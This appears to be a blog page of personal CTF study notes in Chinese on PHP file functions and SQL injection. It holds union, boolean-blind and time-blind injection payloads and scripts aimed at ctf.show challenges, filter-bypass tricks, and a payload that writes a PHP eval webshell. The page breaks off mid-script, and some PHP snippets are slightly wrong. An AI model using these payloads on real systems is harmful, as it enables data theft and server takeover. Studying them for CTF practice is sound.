<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-top10/我那懵逼的问题们" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/%E6%88%91%E9%82%A3%E6%87%B5%E9%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%AC/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.325Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/%E6%88%91%E9%82%A3%E6%87%B5%E9%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%AC/" data-id="cm1zvswq1000orkas7b9x2v8s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/%E5%87%BD%E6%95%B0/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.323Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ul>
<li><pre><code>file_get_contemts,echo
$a=$file[&#39;type&#39;]
move_uploade_file($filename,$destnation)
vardump
peg_match(&quot;/flag/&quot;,$a),如果有返回值是true
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">+ ### preg_match(“/flag/”,$a)//检查变量a里面有没有flag这个词，返回值为true</span><br><span class="line"></span><br><span class="line">+ var_dump输出变量的结构</span><br><span class="line"></span><br><span class="line">  ```php</span><br><span class="line">  $a=array(1,2,&quot;hellow&quot;,&quot;abc&quot;)</span><br><span class="line">     var_dump($a);</span><br><span class="line">  就会输出</span><br><span class="line">      array(4)&#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      int(1)</span><br><span class="line">         [1]=&gt;</span><br><span class="line">        int(2)</span><br><span class="line">        [2]=&gt;</span><br><span class="line">        string(5) &quot;Hello&quot;</span><br><span class="line">        [3]=&gt;</span><br><span class="line">        string(5) &quot;World&quot;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>


</code></pre>
</li>
<li><p>关于file的一些函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 如果 $_FILES 超全局数组中存在 &#x27;file&#x27; 这个键（通常是一个表单字段的名称），则执行以下代码</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 突出显示当前文件的源代码</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="comment">// 将上传的文件信息赋值给 $file 变量</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 获取上传文件的原始名称</span></span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>]; <span class="comment">// 获取上传文件的 MIME 类型</span></span><br><span class="line">    <span class="variable">$filesize</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>]; <span class="comment">// 获取上传文件的大小（字节）</span></span><br><span class="line">    <span class="variable">$filetmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取上传文件在服务器上的临时存储路径</span></span><br><span class="line">    <span class="variable">$fileerror</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]; <span class="comment">// 获取上传过程中的错误代码（如果没有错误，通常是 0）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">  <span class="comment">// 定义文件的目标路径，将文件移动到 &#x27;uploads/&#x27; 目录下，并保留原始文件名</span></span><br><span class="line">  <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$filetmp</span>, <span class="variable">$destination</span>);</span><br><span class="line">  <span class="comment">// 使用 move_uploaded_file 函数将临时文件（$filetmp）移动到目标路径</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents 它不会产生回显（echo），但它会返回文件内容作为字符串。如果文件读取成功，返回的是文件的内容；如果失败，则返回 false。</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/%E5%87%BD%E6%95%B0/" data-id="cm1zvswq1000nrkasg6xm6xdk" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/SQL" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/SQL/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.321Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h1><p>基本流程就是以下这些句子</p>
<p>先检测是否是union注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3.</span>..</span><br><span class="line">url<span class="operator">+</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line">						 <span class="number">2</span></span><br><span class="line">						 <span class="number">3.</span>.. <span class="operator">/</span><span class="operator">/</span>直到报错</span><br></pre></td></tr></table></figure>

<p>注入方法：</p>
<p>Union 联合查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata <span class="operator">/</span><span class="operator">/</span>爆数据库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;库&#x27;</span>   <span class="operator">/</span><span class="operator">/</span>爆表</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;库&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表&#x27;</span><span class="operator">/</span><span class="operator">/</span>爆字段</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(字段) <span class="keyword">from</span> 库.表 <span class="operator">/</span><span class="operator">/</span>爆数据</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> id,<span class="number">2</span>,password <span class="keyword">from</span> ctfshow_user3 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">-- +</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> password,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> ctfshow_user<span class="comment">--+ //直接查表</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;uNion selEct 1,grOup_concat(flag) frOm sshdb.adwoivfhaoihfagfiuaviuf --+</span><br></pre></td></tr></table></figure>

<p>feoekpdgoplonofn</p>
<p>imkbqlhpjlijfbnm</p>
<p>当有敏感字段过滤时，用<code>to_base64()</code>,<code>hex()</code> ，把字段转出来再读</p>
<p>当然，过滤了数字的话，一个好办法是先转换成hex，然后去用小写字母替代数字</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select &#x27;</span>q<span class="string">&#x27;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password), &#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>q<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>w<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>e<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>r<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>t<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>y<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>u<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>i<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>o<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>p<span class="string">&#x27;)  from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>

<p>python脚本复原如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_letters_with_numbers</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># Mapping from letters to corresponding numbers</span></span><br><span class="line">    replacements = &#123;</span><br><span class="line">        <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Replace each letter in the input string according to the mapping</span></span><br><span class="line">    replaced_string = <span class="string">&#x27;&#x27;</span>.join(replacements[char] <span class="keyword">if</span> char <span class="keyword">in</span> replacements <span class="keyword">else</span> char <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> replaced_string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_string</span>(<span class="params">hex_string</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Convert the hex string to bytes</span></span><br><span class="line">        byte_string = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line">        <span class="comment"># Decode the bytes object to an ASCII/UTF-8 string</span></span><br><span class="line">        ascii_string = byte_string.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> ascii_string</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example input string</span></span><br><span class="line">input_string = <span class="built_in">input</span>(<span class="string">&quot;Enter SQL result: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the letters in the string</span></span><br><span class="line">replaced_string = replace_letters_with_numbers(input_string)</span><br><span class="line"><span class="comment">#print(replaced_string)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decoded string:&#x27;</span>,hex_to_string(replaced_string))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>还得学学</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;https://2dbcca5d-573c-4259-956c-fe14c1115999.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flagstr= <span class="string">&quot;&#125;abcdefghijklmnopqrs-tuvwxyz0123456789&#123;&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#data[&quot;tableName&quot;] = data[&quot;tableName&quot;].format(j)</span></span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        sleepTime = <span class="number">0.2</span></span><br><span class="line">        time.sleep(sleepTime)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;===============&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: &#123;&#125; not found in response&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span>   <span class="comment">#40</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的，就睡一段时间</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="时间盲注-二分法"><a href="#时间盲注-二分法" class="headerlink" title="时间盲注(二分法)"></a>时间盲注(二分法)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://6726cfb6-39a2-429c-8dc5-0344ed793174.challenge.ctf.show/api/v5.php?id=1&#x27;&quot;</span> <span class="comment">#url需要每个题目去微调，找到上传接口</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#flag的位数</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># 中间指针等于头尾指针相加的一半 等价于mid=(head+tail)/2</span></span><br><span class="line">        <span class="comment">#修改payload 需要手工注入找下表结构</span></span><br><span class="line">        payload = <span class="string">&quot;and if(ascii(substr((select  password from ctfshow_user5 where username = &#x27;flag&#x27; ),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(3),1)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleep导致超时</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="MySQL写SHELL"><a href="#MySQL写SHELL" class="headerlink" title="MySQL写SHELL"></a>MySQL写SHELL</h1><p>这个复现失败了貌似 URL编码食用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; UNION ALL SELECT 1,2,&#x27;</span><span class="operator">&lt;</span>?php echo <span class="number">123</span>;eval($_POST[<span class="number">0</span>]);?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>php<span class="string">&#x27; %23</span></span><br><span class="line"><span class="string">?id=&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php echo 123;eval($_POST[0])?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span> <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><p><code>select</code>用 <code>Select</code>绕过</p>
<p><code>--+</code>用<code>%23</code>绕过 </p>
<p><code>%23</code>被过滤考虑这种payload？</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">999</span><span class="string">&#x27;union%0cselect&#x27;</span><span class="number">1</span><span class="string">&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;</span>flag<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>空格用<code>%0A</code>绕过； <code>%0A</code>被过滤就用<code>%0C</code></p>
<p>简单的例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure>

<p><code>select</code>被过滤 闭合引号以后，用原本查询语句的select查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername=&#x27;flag</span><br></pre></td></tr></table></figure>

<p>过滤了flag类似的，采用模糊匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername%0clike&#x27;%fla%</span><br></pre></td></tr></table></figure>

<p>过滤<code>where</code>可以用<code>having</code></p>
<p>过滤单引号可以用char()十六进制或者ascii码绕过(直接输入字符)</p>
<p>过滤数字可以用<code>true</code></p>
<p>用这个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">//这个函数用于生成绕过的字符</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            